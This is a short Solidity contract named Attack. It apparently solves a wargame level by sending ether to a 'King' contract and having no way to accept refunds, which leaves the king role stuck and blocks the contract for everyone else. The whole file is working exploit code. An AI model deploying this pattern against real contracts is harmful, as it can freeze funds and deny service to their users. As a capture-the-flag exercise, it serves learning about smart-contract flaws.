// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract Attack {
    King private immutable _king;

    constructor(King king) {
        _king = king;
    }

    function attack() public payable {
        (bool succ,) = address(_king).call{value: msg.value}("");
        require(succ);
    }
}
